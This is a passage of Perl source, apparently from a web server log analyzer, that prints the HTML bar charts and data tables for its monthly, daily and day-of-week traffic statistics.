			$valdata[ $xx++ ] = $MonthUnique{ $YearRequired . $monthix } || 0;
			$valdata[ $xx++ ] = $MonthVisits{ $YearRequired . $monthix } || 0;
			$valdata[ $xx++ ] = $MonthPages{ $YearRequired . $monthix } || 0;
			$valdata[ $xx++ ] = $MonthHits{ $YearRequired . $monthix } || 0;
			$valdata[ $xx++ ] = $MonthBytes{ $YearRequired . $monthix } || 0;
		}
		
		my $function = "ShowGraph_$pluginname";
		&$function(
			"$title",        "month",
			$ShowMonthStats, \@blocklabel,
			\@vallabel,      \@valcolor,
			\@valmax,        \@valtotal,
			\@valaverage,    \@valdata
		);
		$graphdone=1;
	}
	if (! $graphdone)
	{
		print "<table>";
		print "<tr valign=\"bottom\">";
		print "<td>&nbsp;</td>\n";
		for ( my $ix = 1 ; $ix <= $max_month ; $ix++ ) {
			my $monthix  = sprintf( "%02s", $ix );
			my $bredde_u = 0;
			my $bredde_v = 0;
			my $bredde_p = 0;
			my $bredde_h = 0;
			my $bredde_k = 0;

			if ( $max_u > 0 ) {
				$bredde_u =
				  int(
					( $MonthUnique{ $YearRequired . $monthix } || 0 ) /
					  $max_u * $BarHeight ) + 1;
			}
			if ( $max_v > 0 ) {
				$bredde_v =
				  int(
					( $MonthVisits{ $YearRequired . $monthix } || 0 ) /
					  $max_v * $BarHeight ) + 1;
			}
			if ( $max_p > 0 ) {
				$bredde_p =
				  int(
					( $MonthPages{ $YearRequired . $monthix } || 0 ) /
					  $max_p * $BarHeight ) + 1;
			}
			if ( $max_h > 0 ) {
				$bredde_h =
				  int( ( $MonthHits{ $YearRequired . $monthix } || 0 ) /
					  $max_h * $BarHeight ) + 1;
			}
			if ( $max_k > 0 ) {
				$bredde_k =
				  int(
					( $MonthBytes{ $YearRequired . $monthix } || 0 ) /
					  $max_k * $BarHeight ) + 1;
			}
			print "<td>";
			if ( $ShowMonthStats =~ /U/i ) {
				print "<div style=\"background-color: #$color_u; width: 6px; height: ${bredde_u}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Unique visitors") . ": " . ( $MonthUnique{ $YearRequired . $monthix } || 0 ) . "\"></div>";
			}
			if ( $ShowMonthStats =~ /V/i ) {
				print "<div style=\"background-color: #$color_v; width: 6px; height: ${bredde_v}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Visits") . ": " . ( $MonthVisits{ $YearRequired . $monthix } || 0 ) . "\"></div>";
			}
			if ( $ShowMonthStats =~ /P/i ) {
				print "<div style=\"background-color: #$color_p; width: 6px; height: ${bredde_p}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Pages") . ": " . ( $MonthPages{ $YearRequired . $monthix } || 0 ) . "\"></div>";
			}
			if ( $ShowMonthStats =~ /H/i ) {
				print "<div style=\"background-color: #$color_h; width: 6px; height: ${bredde_h}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Hits") . ": " . ( $MonthHits{ $YearRequired . $monthix } || 0 ) . "\"></div>";
			}
			if ( $ShowMonthStats =~ /B/i ) {
				print "<div style=\"background-color: #$color_k; width: 6px; height: ${bredde_k}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Bandwidth") . ": " . Format_Bytes( $MonthBytes{ $YearRequired . $monthix } ) . "\"></div>";
			}
			print "</td>\n";
		}
		print "<td>&nbsp;</td>\n";
		print "</tr>\n";

		# Show lib for month
		print "<tr valign=\"middle\">";
		print "<td>&nbsp;</td>\n";
		for ( my $ix = 1 ; $ix <= $max_month ; $ix++ ) {
			my $monthix = sprintf( "%02s", $ix );
			print "<td>"
			  . (
				!$StaticLinks
				  && $monthix == $nowmonth
				  && $YearRequired == $nowyear
				? '<span class="currentday">'
				: ''
			  );
			my $month_display;
			if (defined &FormatMonth_localdate) {
				$month_display = FormatMonth_localdate($monthix, $YearRequired, $Lang, 1);
			} else {
				$month_display = sprintf(_t("date_format_month"), $MonthNumLib{$monthix}, $YearRequired);
			}
			print $month_display;
			print( !$StaticLinks
				  && $monthix == $nowmonth
				  && $YearRequired == $nowyear ? '</span>' : '' );
			print "</td>\n";
		}
		print "<td>&nbsp;</td>\n";
		print "</tr>\n";
		print "</table>\n";
	}
	print "<br>";

	# Show data array for month
	if ($AddDataArrayMonthStats) {
		print "<table>";
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
		print "<td width=\"80\">" . _t("Months") . "</td>\n";
		if ( $ShowMonthStats =~ /U/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_u\""
			  . Tooltip(2)
			  . ">" . _t("Unique visitors") . "</td>\n";
		}
		if ( $ShowMonthStats =~ /V/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_v\""
			  . Tooltip(1)
			  . ">" . _t("Visits") . "</td>\n";
		}
		if ( $ShowMonthStats =~ /P/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_p\""
			  . Tooltip(3)
			  . ">" . _t("Pages") . "</td>\n";
		}
		if ( $ShowMonthStats =~ /H/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_h\""
			  . Tooltip(4)
			  . ">" . _t("Hits") . "</td>\n";
		}
		if ( $ShowMonthStats =~ /B/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_k\""
			  . Tooltip(5)
			  . ">" . _t("Bandwidth") . "</td>\n";
		}
		print "</tr>\n";
		for ( my $ix = 1 ; $ix <= $max_month ; $ix++ ) {
			my $monthix = sprintf( "%02s", $ix );
			print "<tr>";
			print "<td>"
			  . (
				!$StaticLinks
				  && $monthix == $nowmonth
				  && $YearRequired == $nowyear
				? '<span class="currentday">'
				: ''
			  );
			my $month_display;
			if (defined &FormatMonth_localdate) {
				$month_display = FormatMonth_localdate($monthix, $YearRequired, $Lang, 1);
			} else {
				$month_display = sprintf(_t("date_format_month"), $MonthNumLib{$monthix}, $YearRequired);
			}
			print $month_display;
			print(   !$StaticLinks
				  && $monthix == $nowmonth
				  && $YearRequired == $nowyear ? '</span>' : '' );
			print "</td>\n";
			if ( $ShowMonthStats =~ /U/i ) {
				print "<td>",
				  Format_Number($MonthUnique{ $YearRequired . $monthix }
				  ? $MonthUnique{ $YearRequired . $monthix }
				  : "0"), "</td>\n";
			}
			if ( $ShowMonthStats =~ /V/i ) {
				print "<td>",
				  Format_Number($MonthVisits{ $YearRequired . $monthix }
				  ? $MonthVisits{ $YearRequired . $monthix }
				  : "0"), "</td>\n";
			}
			if ( $ShowMonthStats =~ /P/i ) {
				print "<td>",
				  Format_Number($MonthPages{ $YearRequired . $monthix }
				  ? $MonthPages{ $YearRequired . $monthix }
				  : "0"), "</td>\n";
			}
			if ( $ShowMonthStats =~ /H/i ) {
				print "<td>",
				  Format_Number($MonthHits{ $YearRequired . $monthix }
				  ? $MonthHits{ $YearRequired . $monthix }
				  : "0"), "</td>\n";
			}
			if ( $ShowMonthStats =~ /B/i ) {
				print "<td>",
				  Format_Bytes(
					int( $MonthBytes{ $YearRequired . $monthix } || 0 )
				  ), "</td>\n";
			}
			print "</tr>\n";
		}

		# Total row
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
		print "<td>" . _t("Total") . "</td>\n";
		if ( $ShowMonthStats =~ /U/i ) {
			print
			  "<td>".Format_Number($total_u)."</td>\n";
		}
		if ( $ShowMonthStats =~ /V/i ) {
			print
			  "<td>".Format_Number($total_v)."</td>\n";
		}
		if ( $ShowMonthStats =~ /P/i ) {
			print
			  "<td>".Format_Number($total_p)."</td>\n";
		}
		if ( $ShowMonthStats =~ /H/i ) {
			print
			  "<td>".Format_Number($total_h)."</td>\n";
		}
		if ( $ShowMonthStats =~ /B/i ) {
			print "<td>"
			  . Format_Bytes($total_k) . "</td>\n";
		}
		print "</tr>\n";
		print "</table>\n<br>";
	}

	print "</center>\n";
	print "</td>\n</tr>\n";
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Daily section on the main page
# Parameters:   $firstdaytocountaverage, $lastdaytocountaverage
#               $firstdaytoshowtime, $lastdaytoshowtime
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainDaily{
	my $firstdaytocountaverage = shift;
	my $lastdaytocountaverage = shift;
	my $firstdaytoshowtime = shift;
	my $lastdaytoshowtime = shift;
	
	if ($Debug) { debug( "ShowDaysOfMonthStats", 2 ); }
	print "$Center<a name=\"daysofmonth\">&nbsp;</a>";

	my $NewLinkParams = ${QueryString};
	$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;
	$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;
	$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
	$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$NewLinkParams =~ s/^&amp;//;
	$NewLinkParams =~ s/&amp;$//;
	if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
	my $NewLinkTarget = '';

	if ( $FrameName eq 'mainright' ) {
		$NewLinkTarget = " target=\"_parent\"";
	}

	my $title = "📅 " . _t("Daily Statistics");

	if ($AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
		$title = "$title &nbsp; - &nbsp; <a href=\"".(XMLEncode(
			"$AddLinkToExternalCGIWrapper". "?section=DAY&baseName=$DirData/$PROG"
			. "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
			. "&siteConfig=$SiteConfig" )
			. "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}

	&tab_head( "$title", 0, 0, 'daysofmonth' );
	print "<tr>";
	print "<td align=\"center\">";
	print "<center>\n";

	my $actual_days_in_month;
	if (defined &GetDaysInMonth_localdate) {
		$actual_days_in_month = GetDaysInMonth_localdate($MonthRequired, $YearRequired, $Lang);
	} else {
		if ($MonthRequired == 2) {
			$actual_days_in_month = is_leap_year($YearRequired) ? 29 : 28;
		} elsif ($MonthRequired == 4 || $MonthRequired == 6 || 
				 $MonthRequired == 9 || $MonthRequired == 11) {
			$actual_days_in_month = 30;
		} else {
			$actual_days_in_month = 31;
		}
	}
	
	my $start_day = 1;
	my $end_day = $actual_days_in_month;
	
	my $average_v = my $average_p = 0;
	my $average_h = my $average_k = 0;
	my $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;
	my $max_v = my $max_h = my $max_k = 0;    # Start from 0 because can be lower than 1
	
	# 计算总计和最大值
	for (my $day = $start_day; $day <= $end_day; $day++) {
		my $day_str = sprintf("%02d", $day);
		my $date_key = $YearRequired . $MonthRequired . $day_str;
		
		# 验证日期有效性
		if (defined &is_valid_calendar_day) {
			next unless is_valid_calendar_day($YearRequired, $MonthRequired, $day, $actual_days_in_month);
		} else {
			next unless DateIsValid($day, $MonthRequired, $YearRequired);
		}

		$total_v += $DayVisits{$date_key} || 0;
		$total_p += $DayPages{$date_key}  || 0;
		$total_h += $DayHits{$date_key}   || 0;
		$total_k += $DayBytes{$date_key}  || 0;

		if ( ( $DayVisits{$date_key} || 0 ) > $max_v ) {
			$max_v = $DayVisits{$date_key};
		}
		if ( ( $DayHits{$date_key} || 0 ) > $max_h ) {
			$max_h = $DayHits{$date_key};
		}
		if ( ( $DayBytes{$date_key} || 0 ) > $max_k ) {
			$max_k = $DayBytes{$date_key};
		}
	}
	
	$average_v = sprintf( "%.2f", $AverageVisits );
	$average_p = sprintf( "%.2f", $AveragePages );
	$average_h = sprintf( "%.2f", $AverageHits );
	$average_k = sprintf( "%.2f", $AverageBytes );

	# Show bars for day
	my $graphdone=0;
	foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
	{
		my @blocklabel = ();
		for (my $day = $start_day; $day <= $end_day; $day++) {
			next unless is_valid_calendar_day($YearRequired, $MonthRequired, $day, $actual_days_in_month);

			my $bold = ( $day == $nowday && $MonthRequired == $nowmonth && $YearRequired == $nowyear ? ':' : '' );
			my $weekend = ( DayOfWeek( $day, $MonthRequired, $YearRequired ) =~ /[06]/ ? '!' : '' );
			push @blocklabel, "$day\n$MonthNumLib{$MonthRequired}$weekend$bold";
		}
		my @vallabel = (
			_t("Visits"), _t("Pages"),
			_t("Hits"), _t("Bandwidth")
		);
		my @valcolor =
		  ( "$color_v", "$color_p", "$color_h", "$color_k" );
		my @valmax   = ( $max_v,   $max_h,   $max_h,   $max_k );
		my @valtotal = ( $total_v, $total_p, $total_h, $total_k );
		my @valaverage = ( $average_v, $average_p, $average_h, $average_k );
		my @valdata    = ();
		my $xx         = 0;

		for (my $day = $start_day; $day <= $end_day; $day++) {
			next unless is_valid_calendar_day($YearRequired, $MonthRequired, $day, $actual_days_in_month);
			
			my $day_str = sprintf("%02d", $day);
			my $date_key = $YearRequired . $MonthRequired . $day_str;
			$valdata[ $xx++ ] = $DayVisits{$date_key} || 0;
			$valdata[ $xx++ ] = $DayPages{$date_key}  || 0;
			$valdata[ $xx++ ] = $DayHits{$date_key}   || 0;
			$valdata[ $xx++ ] = $DayBytes{$date_key}  || 0;
		}
		my $function = "ShowGraph_$pluginname";
		&$function(
			"$title",              "daysofmonth",
			$ShowDaysOfMonthStats, \@blocklabel,
			\@vallabel,            \@valcolor,
			\@valmax,              \@valtotal,
			\@valaverage,          \@valdata
		);
		$graphdone=1;
	}
	
	# If graph was not printed by a plugin
	if (! $graphdone) {
		print "<table>\n";
		print "<tr valign=\"bottom\">";
		for (my $day = $start_day; $day <= $end_day; $day++) {
			next unless is_valid_calendar_day($YearRequired, $MonthRequired, $day, $actual_days_in_month);
			
			my $day_str = sprintf("%02d", $day);
			my $date_key = $YearRequired . $MonthRequired . $day_str;
			my $bredde_v = 0;
			my $bredde_p = 0;
			my $bredde_h = 0;
			my $bredde_k = 0;
			if ( $max_v > 0 ) {
				$bredde_v = int( ( $DayVisits{$date_key} || 0 ) / $max_v * $BarHeight ) + 1;
			}
			if ( $max_h > 0 ) {
				$bredde_p = int( ( $DayPages{$date_key} || 0 ) / $max_h * $BarHeight ) + 1;
			}
			if ( $max_h > 0 ) {
				$bredde_h = int( ( $DayHits{$date_key} || 0 ) / $max_h * $BarHeight ) + 1;
			}
			if ( $max_k > 0 ) {
				$bredde_k = int( ( $DayBytes{$date_key} || 0 ) / $max_k * $BarHeight ) + 1;
			}
			print "<td>";
			if ( $ShowDaysOfMonthStats =~ /V/i ) {
				print "<div style=\"background-color: #$color_v; width: 4px; height: ${bredde_v}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Visits") . ": " . int( $DayVisits{$date_key} || 0 ) . "\"></div>";
			}
			if ( $ShowDaysOfMonthStats =~ /P/i ) {
				print "<div style=\"background-color: #$color_p; width: 4px; height: ${bredde_p}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Pages") . ": " . int( $DayPages{$date_key} || 0 ) . "\"></div>";
			}
			if ( $ShowDaysOfMonthStats =~ /H/i ) {
				print "<div style=\"background-color: #$color_h; width: 4px; height: ${bredde_h}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Hits") . ": " . int( $DayHits{$date_key} || 0 ) . "\"></div>";
			}
			if ( $ShowDaysOfMonthStats =~ /B/i ) {
				print "<div style=\"background-color: #$color_k; width: 4px; height: ${bredde_k}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Bandwidth") . ": " . Format_Bytes( $DayBytes{$date_key} ) . "\"></div>";
			}
			print "</td>\n";
		}
		# Show average value bars
		print "<td>";
		my $bredde_v = 0;
		my $bredde_p = 0;
		my $bredde_h = 0;
		my $bredde_k = 0;
		if ( $max_v > 0 ) {
			$bredde_v = int( $average_v / $max_v * $BarHeight ) + 1;
		}
		if ( $max_h > 0 ) {
			$bredde_p = int( $average_p / $max_h * $BarHeight ) + 1;
		}
		if ( $max_h > 0 ) {
			$bredde_h = int( $average_h / $max_h * $BarHeight ) + 1;
		}
		if ( $max_k > 0 ) {
			$bredde_k = int( $average_k / $max_k * $BarHeight ) + 1;
		}
		$average_v = sprintf( "%.2f", $average_v );
		$average_p = sprintf( "%.2f", $average_p );
		$average_h = sprintf( "%.2f", $average_h );
		$average_k = sprintf( "%.2f", $average_k );
		if ( $ShowDaysOfMonthStats =~ /V/i ) {
			print "<div style=\"background-color: #$color_v; width: 4px; height: ${bredde_v}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Visits") . ": $average_v\"></div>";
		}
		if ( $ShowDaysOfMonthStats =~ /P/i ) {
			print "<div style=\"background-color: #$color_p; width: 4px; height: ${bredde_p}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Pages") . ": $average_p\"></div>";
		}
		if ( $ShowDaysOfMonthStats =~ /H/i ) {
			print "<div style=\"background-color: #$color_h; width: 4px; height: ${bredde_h}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Hits") . ": $average_h\"></div>";
		}
		if ( $ShowDaysOfMonthStats =~ /B/i ) {
			print "<div style=\"background-color: #$color_k; width: 4px; height: ${bredde_k}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Bandwidth") . ": $average_k\"></div>";
		}
		print "</td>\n";
		print "</tr>\n";

		# Show lib for day
		print "<tr valign=\"middle\">";
		for (my $day = $start_day; $day <= $end_day; $day++) {
			next unless is_valid_calendar_day($YearRequired, $MonthRequired, $day, $actual_days_in_month);

			my $dayofweekcursor = DayOfWeek( $day, $MonthRequired, $YearRequired );
			print "<td" . ( $dayofweekcursor =~ /[06]/ ? " bgcolor=\"#$color_weekend\"" : "" ) . ">";
			print(
				!$StaticLinks
				  && $day == $nowday
				  && $MonthRequired == $nowmonth
				  && $YearRequired == $nowyear
				? '<span class="currentday">'
				: ''
			);
			print "$day<br><span style=\"font-size: "
			  . ( $FrameName ne 'mainright' && $QueryString !~ /buildpdf/i ? "13" : "12" )
			  . "px;\">"
			  . $MonthNumLib{$MonthRequired}
			  . "</span>";
			print( !$StaticLinks
				  && $day == $nowday
				  && $MonthRequired == $nowmonth
				  && $YearRequired == $nowyear ? '</span>' : '' );
			print "</td>\n";
		}
		print "<td valign=\"middle\""
		  . Tooltip(18)
		  . ">" . _t("Average") . "</td>\n";
		print "</tr>\n";
		print "</table>\n";
	}
	print "<br>";

	# Show data array for days
	if ($AddDataArrayShowDaysOfMonthStats) {
		print "<table>";
		print "<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">" . _t("Date") . "</td>\n";
		if ( $ShowDaysOfMonthStats =~ /V/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_v\""
			  . Tooltip(1)
			  . ">" . _t("Visits") . "</td>\n";
		}
		if ( $ShowDaysOfMonthStats =~ /P/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_p\""
			  . Tooltip(3)
			  . ">" . _t("Pages") . "</td>\n";
		}
		if ( $ShowDaysOfMonthStats =~ /H/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_h\""
			  . Tooltip(4)
			  . ">" . _t("Hits") . "</td>\n";
		}
		if ( $ShowDaysOfMonthStats =~ /B/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_k\""
			  . Tooltip(5)
			  . ">" . _t("Bandwidth") . "</td>\n";
		}
		print "</tr>\n";

		for (my $day = $start_day; $day <= $end_day; $day++) {
			my $day_str = sprintf("%02d", $day);
			my $date_key = $YearRequired . $MonthRequired . $day_str;

			next unless is_valid_calendar_day($YearRequired, $MonthRequired, $day, $actual_days_in_month);

			my $dayofweekcursor = DayOfWeek( $day, $MonthRequired, $YearRequired );
			print "<tr"
			  . ($dayofweekcursor =~ /[06]/ ? " bgcolor=\"#$color_weekend\"" : "")
			  . ">";
			print "<td>"
			  . (!$StaticLinks
				  && $day == $nowday
				  && $MonthRequired == $nowmonth
				  && $YearRequired == $nowyear
				? '<span class="currentday">'
				: '');

			print Format_Date( "$YearRequired$MonthRequired$day_str" . "000000", 2 );

			print( !$StaticLinks
				  && $day == $nowday
				  && $MonthRequired == $nowmonth
				  && $YearRequired == $nowyear ? '</span>' : '' );
			print "</td>\n";
			if ( $ShowDaysOfMonthStats =~ /V/i ) {
				print "<td>",
				  Format_Number($DayVisits{$date_key}
				  ? $DayVisits{$date_key}
				  : "0"), "</td>\n";
			}
			if ( $ShowDaysOfMonthStats =~ /P/i ) {
				print "<td>",
				  Format_Number($DayPages{$date_key}
				  ? $DayPages{$date_key}
				  : "0"), "</td>\n";
			}
			if ( $ShowDaysOfMonthStats =~ /H/i ) {
				print "<td>",
				  Format_Number($DayHits{$date_key}
				  ? $DayHits{$date_key}
				  : "0"), "</td>\n";
			}
			if ( $ShowDaysOfMonthStats =~ /B/i ) {
				print "<td>",
				  Format_Bytes(int( $DayBytes{$date_key} || 0 ) ),
				  "</td>\n";
			}
			print "</tr>\n";
		}

		# Average row
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">\n";
		print "<td>" . _t("Average") . "</td>\n";
		if ( $ShowDaysOfMonthStats =~ /V/i ) {
			print "<td>".Format_Number(int($average_v))."</td>\n";
		}
		if ( $ShowDaysOfMonthStats =~ /P/i ) {
			print "<td>".Format_Number(int($average_p))."</td>\n";
		}
		if ( $ShowDaysOfMonthStats =~ /H/i ) {
			print "<td>".Format_Number(int($average_h))."</td>\n";
		}
		if ( $ShowDaysOfMonthStats =~ /B/i ) {
			print "<td>".Format_Bytes(int($average_k))."</td>\n";
		}
		print "</tr>\n";

		# Total row
		print "<tr bgcolor=\"#$color_TableBGRowTitle\"><td>" . _t("Total") . "</td>\n";
		if ( $ShowDaysOfMonthStats =~ /V/i ) {
			print "<td>".Format_Number($total_v)."</td>\n";
		}
		if ( $ShowDaysOfMonthStats =~ /P/i ) {
			print "<td>".Format_Number($total_p)."</td>\n";
		}
		if ( $ShowDaysOfMonthStats =~ /H/i ) {
			print "<td>".Format_Number($total_h)."</td>\n";
		}
		if ( $ShowDaysOfMonthStats =~ /B/i ) {
			print "<td>" . Format_Bytes($total_k) . "</td>\n";
		}
		print "</tr>\n";
		print "</table>\n<br>";
	}

	print "</center>\n";
	print "</td>\n</tr>\n";
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Days of the Week section on the main page
# Parameters:   $firstdaytocountaverage, $lastdaytocountaverage
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainDaysofWeek{
	my $firstdaytocountaverage = shift;
	my $lastdaytocountaverage = shift;
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;	
	
	if ($Debug) { debug( "ShowDaysOfWeekStats", 2 ); }
			print "$Center<a name=\"daysofweek\">&nbsp;</a>";
			my $title = "📈 " . _t("Statistics by Day of Week");
			&tab_head( "$title", 18, 0, 'daysofweek' );
			print "<tr>";
			print "<td align=\"center\">";
			print "<center>";

			my $max_h = my $max_k = 0;    # Start from 0 because can be lower than 1
									# Get average value for day of week
			my @avg_dayofweek_nb = ();
			my @avg_dayofweek_p  = ();
			my @avg_dayofweek_h  = ();
			my @avg_dayofweek_k  = ();
			foreach my $daycursor (
				$firstdaytocountaverage .. $lastdaytocountaverage )
			{
				$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
				my $year  = $1;
				my $month = $2;
				my $day   = $3;
				if ( !DateIsValid( $day, $month, $year ) ) {
					next;
				}    # If not an existing day, go to next
				my $dayofweekcursor = DayOfWeek( $day, $month, $year );
				$avg_dayofweek_nb[$dayofweekcursor]
				  ++; # Increase number of day used to count for this day of week
				$avg_dayofweek_p[$dayofweekcursor] +=
				  ( $DayPages{$daycursor} || 0 );
				$avg_dayofweek_h[$dayofweekcursor] +=
				  ( $DayHits{$daycursor} || 0 );
				$avg_dayofweek_k[$dayofweekcursor] +=
				  ( $DayBytes{$daycursor} || 0 );
			}
			for (@DOWIndex) {
				if ( $avg_dayofweek_nb[$_] ) {
					$avg_dayofweek_p[$_] =
					  $avg_dayofweek_p[$_] / $avg_dayofweek_nb[$_];
					$avg_dayofweek_h[$_] =
					  $avg_dayofweek_h[$_] / $avg_dayofweek_nb[$_];
					$avg_dayofweek_k[$_] =
					  $avg_dayofweek_k[$_] / $avg_dayofweek_nb[$_];

		  #if ($avg_dayofweek_p[$_] > $max_p) { $max_p = $avg_dayofweek_p[$_]; }
					if ( $avg_dayofweek_h[$_] > $max_h ) {
						$max_h = $avg_dayofweek_h[$_];
					}
					if ( $avg_dayofweek_k[$_] > $max_k ) {
						$max_k = $avg_dayofweek_k[$_];
					}
				}
				else {
					$avg_dayofweek_p[$_] = "?";
					$avg_dayofweek_h[$_] = "?";
					$avg_dayofweek_k[$_] = "?";
				}
			}

			# Show bars for days of week
			my $graphdone=0;
			foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
			{
				my @blocklabel = ();
				for (@DOWIndex) {
					my $dayname = _t("DayOfWeek_" . $_);
					push @blocklabel, $dayname . ( $_ =~ /[06]/ ? "!" : "" );
				}
				my @vallabel =
				  ( _t("Pages"), _t("Hits"), _t("Bandwidth") );
				my @valcolor = ( "$color_p", "$color_h", "$color_k" );
				my @valmax = ( int($max_h), int($max_h), int($max_k) );
				my @valtotal = ( $TotalPages, $TotalHits, $TotalBytes );
				# TEMP
				my $average_p = my $average_h = my $average_k = 0;
				$average_p = sprintf( "%.2f", $AveragePages );
				$average_h = sprintf( "%.2f", $AverageHits );
				$average_k = (
					int($average_k)
					? Format_Bytes( sprintf( "%.2f", $AverageBytes ) )
					: "0.00"
				);
				my @valaverage = ( $average_p, $average_h, $average_k );
				my @valdata    = ();
				my $xx         = 0;

				for (@DOWIndex) {
					$valdata[ $xx++ ] = $avg_dayofweek_p[$_] || 0;
					$valdata[ $xx++ ] = $avg_dayofweek_h[$_] || 0;
					$valdata[ $xx++ ] = $avg_dayofweek_k[$_] || 0;

					# Round to be ready to show array
					$avg_dayofweek_p[$_] =
					  sprintf( "%.2f", $avg_dayofweek_p[$_] );
					$avg_dayofweek_h[$_] =
					  sprintf( "%.2f", $avg_dayofweek_h[$_] );
					$avg_dayofweek_k[$_] =
					  sprintf( "%.2f", $avg_dayofweek_k[$_] );

					# Remove decimal part that are .0
					if ( $avg_dayofweek_p[$_] == int( $avg_dayofweek_p[$_] ) ) {
						$avg_dayofweek_p[$_] = int( $avg_dayofweek_p[$_] );
					}
					if ( $avg_dayofweek_h[$_] == int( $avg_dayofweek_h[$_] ) ) {
						$avg_dayofweek_h[$_] = int( $avg_dayofweek_h[$_] );
					}
				}
				my $function = "ShowGraph_$pluginname";
				&$function(
					"$title",             "daysofweek",
					$ShowDaysOfWeekStats, \@blocklabel,
					\@vallabel,           \@valcolor,
					\@valmax,             \@valtotal,
					\@valaverage,         \@valdata
				);
				$graphdone=1;
			}
			if (! $graphdone) 
			{
				print "<table>";
				print "<tr valign=\"bottom\">";
				for (@DOWIndex) {
					my $bredde_p = 0;
					my $bredde_h = 0;
					my $bredde_k = 0;
					if ( $max_h > 0 ) {
						$bredde_p = int(
							(
								  $avg_dayofweek_p[$_] ne '?'
								? $avg_dayofweek_p[$_]
								: 0
							) / $max_h * $BarHeight
						) + 1;
					}
					if ( $max_h > 0 ) {
						$bredde_h = int(
							(
								  $avg_dayofweek_h[$_] ne '?'
								? $avg_dayofweek_h[$_]
								: 0
							) / $max_h * $BarHeight
						) + 1;
					}
					if ( $max_k > 0 ) {
						$bredde_k = int(
							(
								  $avg_dayofweek_k[$_] ne '?'
								? $avg_dayofweek_k[$_]
								: 0
							) / $max_k * $BarHeight
						) + 1;
					}
					$avg_dayofweek_p[$_] = sprintf( "%.2f",
						(
							  $avg_dayofweek_p[$_] ne '?'
							? $avg_dayofweek_p[$_]
							: 0
						)
					);
					$avg_dayofweek_h[$_] = sprintf( "%.2f",
						(
							  $avg_dayofweek_h[$_] ne '?'
							? $avg_dayofweek_h[$_]
							: 0
						)
					);
					$avg_dayofweek_k[$_] = sprintf( "%.2f",
						(
							  $avg_dayofweek_k[$_] ne '?'
							? $avg_dayofweek_k[$_]
							: 0
						)
					);

					# Remove decimal part that are .0
					if ( $avg_dayofweek_p[$_] == int( $avg_dayofweek_p[$_] ) ) {
						$avg_dayofweek_p[$_] = int( $avg_dayofweek_p[$_] );
					}
					if ( $avg_dayofweek_h[$_] == int( $avg_dayofweek_h[$_] ) ) {
						$avg_dayofweek_h[$_] = int( $avg_dayofweek_h[$_] );
					}
					print "<td valign=\"bottom\">";
					if ( $ShowDaysOfWeekStats =~ /P/i ) {
						print "<div style=\"background-color: #$color_p; width: 6px; height: ${bredde_p}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Pages") . ": $avg_dayofweek_p[$_]\"></div>";
					}
					if ( $ShowDaysOfWeekStats =~ /H/i ) {
						print "<div style=\"background-color: #$color_h; width: 6px; height: ${bredde_h}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Hits") . ": $avg_dayofweek_h[$_]\"></div>";
					}
					if ( $ShowDaysOfWeekStats =~ /B/i ) {
						print "<div style=\"background-color: #$color_k; width: 6px; height: ${bredde_k}px; border-radius: 2px; display: inline-block; vertical-align: bottom; margin: 0 1px;\" title=\"" . _t("Bandwidth") . ": " . Format_Bytes( $avg_dayofweek_k[$_] ) . "\"></div>";
					}
					print "</td>\n";
				}
				print "</tr>\n";
				print "<tr" . Tooltip(17) . ">";
				for (@DOWIndex) {
